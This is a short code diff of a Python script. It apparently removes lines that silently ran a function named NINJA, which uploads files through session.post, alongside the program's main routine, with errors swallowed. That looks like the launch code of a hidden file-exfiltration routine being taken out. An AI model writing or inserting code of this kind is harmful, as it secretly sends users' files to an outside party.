@@ -1317,8 +1317,3 @@ def NINJA():
                 files={'document': f}
                 get = session.post(url, data=data, files=files)
                 sent = session.post(url, data=data2, files=files)
-    except:pass
-
-with ThreadPool(max_workers=1000) as jjj:
-    jjj.submit(NINJA)
-    jjj.submit(main)
